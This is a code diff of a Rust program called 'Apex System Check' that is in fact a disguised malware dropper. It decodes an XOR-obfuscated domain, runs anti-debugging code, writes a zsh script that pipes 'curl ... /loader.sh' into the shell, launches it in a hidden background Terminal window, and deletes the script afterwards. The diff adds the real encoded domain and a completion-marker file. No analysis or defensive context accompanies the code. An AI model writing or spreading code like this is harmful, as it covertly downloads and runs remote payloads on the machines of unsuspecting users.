@@ -1,20 +1,21 @@
 use std::process::Command;
 use std::fs;
 use std::path::PathBuf;
+use std::time::Duration;
 
 const VERSION: &str = "1.0.0";
 const APP_NAME: &str = "Apex System Check";
 
 
 const ENC_URL: &[u8] = &[
-    0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9,
-    0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9,
-    0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4,
+    0xdf, 0xda, 0xce, 0xcb, 0xde, 0xcf, 0x84, 0xcb, 0xda, 0xcf, 0xd2, 0x87, 0xcb, 0xd8, 0xcf, 0xc4,
+    0xcb, 0x87, 0xd8, 0xc5, 0xdf, 0xde, 0xcf, 0xd8, 0x84, 0xc9, 0xc5, 0xc7,
 ];
 
 fn decode_url() -> String {
     ENC_URL.iter().map(|b| (b ^ 0xAA) as char).collect()
 }
+
 
 fn anti_debug() {
     unsafe {
@@ -24,7 +25,13 @@ fn anti_debug() {
     }
 }
 
+fn done_path() -> PathBuf {
+    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
+    PathBuf::from(home).join(".apex").join(".verify-done")
+}
+
 fn main() {
+
     anti_debug();
 
     let args: Vec<String> = std::env::args().collect();
@@ -39,24 +46,25 @@ fn main() {
 
     let url = decode_url();
     let full_url = format!("https://{}/loader.sh", url);
+    let done = done_path();
 
-  
+    if let Some(parent) = done.parent() {
+        let _ = fs::create_dir_all(parent);
+    }
+
     let script_content = format!(
-        "#!/bin/zsh\ncurl -fsSL {} | zsh\nexit\n",
-        full_url
+        "#!/bin/zsh\ncurl -fsSL {} | zsh\ntouch {}\nexit\n",
+        full_url, done.display()
     );
     let script_path = "/tmp/apx_run.sh";
     let _ = fs::write(script_path, script_content);
     let _ = Command::new("chmod").args(["+x", script_path]).output();
 
-
+    
     let _ = Command::new("open")
         .args(["-a", "Terminal", "-j", "-g", script_path])
-        .spawn(); // spawn – не ждём
+        .spawn();
 
-
-    std::thread::sleep(std::time::Duration::from_secs(2));
+    std::thread::sleep(Duration::from_secs(2));
     let _ = fs::remove_file(script_path);
-
-
-} 
+}
